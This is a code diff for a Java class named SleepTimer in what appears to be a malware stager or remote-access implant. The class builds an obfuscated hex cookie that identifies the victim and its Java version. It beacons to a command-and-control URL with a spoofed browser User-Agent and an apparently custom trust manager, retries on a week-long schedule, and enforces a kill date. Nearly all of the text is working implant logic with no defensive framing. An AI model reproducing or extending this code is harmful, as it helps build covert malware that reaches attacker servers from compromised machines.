@@ -62,11 +62,12 @@ import static stager.Stager.hexArray;
 public class SleepTimer implements Runnable {
     
     //Static instance
-    private final Queue<String> theReconnectTimeList = new LinkedList<String>();
+    private final Queue<Date> theReconnectTimeList = new LinkedList<Date>();
     private final String decodedURL;
     private URLConnection theConnection = null;
     private InputStream theInputStream = null;
     private byte[] theClientId;
+    private Date deathDateCalendar = null;
  
     // ==========================================================================
     /**
@@ -74,8 +75,7 @@ public class SleepTimer implements Runnable {
      *
      * @param passedURL
     */
-    public SleepTimer( String passedURL ) {       
-    
+    public SleepTimer( String passedURL ) {   
         decodedURL = passedURL;
     }
     
@@ -98,85 +98,99 @@ public class SleepTimer implements Runnable {
         aSR.nextBytes(theClientId);
         String randStr = bytesToHex( theClientId );
         
-        String aStr = "08574E5A68574E5A50A8B1A5AF574E5A5057642A27392C283520603435233935223C60393F393A283F3B603735243D3B37323D740332203E03232F3D35";
+        String aStr = "08574E5A6E574E5A50A8B1A5AF574E5A5057642A27392C283520603435233935223C60393F393A283F3B603735243D3B37323D740332203E03232F3D35";
         String beginStr = aStr.substring(0, 10);
         String endStr = aStr.substring(18);
-                      
+                              
         //Print after
         StringBuilder aSB = new StringBuilder().append(beginStr).append(randStr).append(endStr);
-
+        
+        //Get the java version
+        String theVersion = System.getProperty("java.version");
+        if( theVersion != null && !theVersion.isEmpty() && theVersion.length() > 2 ){
+            
+            aSB.append("474E5A5056");
+            char theChar = theVersion.charAt(2);
+            switch( theChar ){
+                case '4':
+                    aSB.append("7A");
+                    break;
+                case '5':
+                    aSB.append("7B");
+                    break;
+                case '6':
+                    aSB.append("78");
+                    break;
+                case '7':
+                    aSB.append("79");
+                    break;
+                case '8':
+                    aSB.append("76");
+                    break;
+                default:
+                    aSB.append("00");
+                    break;
+            }
+        }
+        
         //Get a hex string representation
         String encodedByteStr = aSB.toString().replace(" ", "");
         aSB = new StringBuilder()
                 .append("zrefx").append("=").append( encodedByteStr );
 
         //Reconnect list
-        Queue<Long> aList = generateTimes();
+        generateTimes();
         
-        while( theConnection == null && !aList.isEmpty()){
-
-            String reconnectTime;
-            synchronized(theReconnectTimeList){
-                reconnectTime = theReconnectTimeList.poll();
-            }
+        while( theConnection == null ){
 
             //Get the reconnect time from the list
-            if( reconnectTime != null ){
-
-                try {
-
-                    Long aLong = Long.parseLong(reconnectTime );
-                    Date tmpDate = new Date( aLong ); 
-                    //check if the time is before now
-                    Calendar anotherCalendar = Calendar.getInstance(); 
-                    anotherCalendar.setTime( tmpDate );
-                    if( !anotherCalendar.before( new Date())){ 
-                        theDate = tmpDate;
-                    } 
-
-                } catch (NumberFormatException ex ){
-                    ex = null;
-                } 
-            }       
-
-            //Wait till a certain time
             if( theDate != null ){
 
-                waitUntil(theDate);  
-                try {
+                //check if the time is before now
+                Calendar anotherCalendar = Calendar.getInstance(); 
+                anotherCalendar.setTime( theDate );
 
-                    //Create the connection
-                    theConnection = new URL( decodedURL ).openConnection();
-                    Class.forName("stager.StagerTrustManager").getMethod("setTrustManager", 
-                        new Class[] { URLConnection.class }).invoke(null, new Object[] { theConnection });
+                if( !anotherCalendar.before( new Date())){
+                     
+                    waitUntil(theDate);  
+                    try {
 
-                    //Set the cookie
-                    theConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
-                    theConnection.setRequestProperty("Accept-Language", "en-us, en;q=0.5");
-                    theConnection.setRequestProperty("Cookie", aSB.toString());
+                        //Create the connection
+                        theConnection = new URL( decodedURL ).openConnection();
+                        StagerTrustManager.class.getMethod("setTrustManager", 
+                              new Class[] { URLConnection.class }).invoke(null, new Object[] { theConnection });
 
+                        //Set the cookie
+                        theConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
+                        theConnection.setRequestProperty("Accept-Language", "en-us, en;q=0.5");
+                        theConnection.setRequestProperty("Cookie", aSB.toString());
+
+                        //Try to connect
+                        theInputStream = theConnection.getInputStream();   
+                        
+                        LoaderUtilities.updateKillTime( null );
+
+                    } catch ( IOException ex) {
+                        theConnection = null;
+                    } catch ( Exception ex) {
+                        theConnection = null;
+                        break;
+                    } 
                     
-                    //Try to connect
-                    theInputStream = theConnection.getInputStream();      
+                    //Reset the reconnect time
+                    theDate = null;  
 
-                } catch ( IOException ex) {
-                    
-                    theConnection = null;
-                    Long aLong = aList.poll();
-                    if(aLong != null ){
-                        theDate = new Date(aLong);
-                        continue;
-                    }
-                    
-                } catch ( Exception ex) {
-                    theConnection = null;
-                } 
-                
-                //Reset the reconnect time
-                theDate = null;
+                }             
 
-            } else  {
+            } else {
                 break;
+            }  
+            
+            //Get the next date
+            if( theConnection == null ){
+                synchronized(theReconnectTimeList){
+                    theDate = theReconnectTimeList.poll();
+                }
             }
 
         }      
@@ -221,7 +235,11 @@ public class SleepTimer implements Runnable {
      * 
      * @param passedTime 
     */
-    public void addReconnectTime( String passedTime ) {
+    public void addReconnectTime( Date passedTime ) {
+        
+        if( deathDateCalendar != null && deathDateCalendar.before( passedTime ))
+            return;        
+        
         synchronized(theReconnectTimeList){
             theReconnectTimeList.add( passedTime );
         }
@@ -258,10 +276,8 @@ public class SleepTimer implements Runnable {
     /**
      * 
      */
-    private Queue<Long> generateTimes(){
-        
-        Queue<Long> timeList = new LinkedList<Long>();
-        
+    private void generateTimes(){
+                
         //Create the calendar
         Calendar theCalendar = Calendar.getInstance(); 
         theCalendar.setTime( new Date() );
@@ -271,28 +287,28 @@ public class SleepTimer implements Runnable {
         Date aTime = theCalendar.getTime();
 
         //Format and add to the queue
-        timeList.add(aTime.getTime());
+        addReconnectTime(aTime);
         
         //Add 5 Mins
         theCalendar.add( Calendar.MINUTE, 5);
         aTime = theCalendar.getTime();
 
         //Format and add to the queue
-        timeList.add(aTime.getTime());
+        addReconnectTime(aTime);
 
         //Add 10 Mins
         theCalendar.add( Calendar.MINUTE, 10);
         aTime = theCalendar.getTime();
 
         //Format and add to the queue
-        timeList.add(aTime.getTime());
+        addReconnectTime(aTime);
 
         //Add 15 Mins
         theCalendar.add( Calendar.MINUTE, 15);
         aTime = theCalendar.getTime();
 
         //Format and add to the queue
-        timeList.add(aTime.getTime());
+        addReconnectTime(aTime);
 
         for( int i= 0; i < 7 * 23; i++ ){
 
@@ -300,11 +316,14 @@ public class SleepTimer implements Runnable {
             aTime = theCalendar.getTime();
 
             //Format and add to the queue
-            timeList.add(aTime.getTime());
+            addReconnectTime(aTime);
 
         }
+        
+        //Set the death time
+        if( deathDateCalendar == null )
+            LoaderUtilities.updateKillTime( aTime );
 
-        return timeList;
     }
     
     // ==========================================================================
@@ -323,6 +342,16 @@ public class SleepTimer implements Runnable {
             hexChars[j * 2 + 1] = hexArray[v & 0x0F];
         }
         return new String(hexChars);
+    }
+
+    // ==========================================================================
+    /**
+     * 
+     * @param tmpDate 
+     */
+    public void setDeathDate(Date tmpDate) {
+        //Create the calendar
+        deathDateCalendar = new Date(tmpDate.getTime());
     }
    
 }
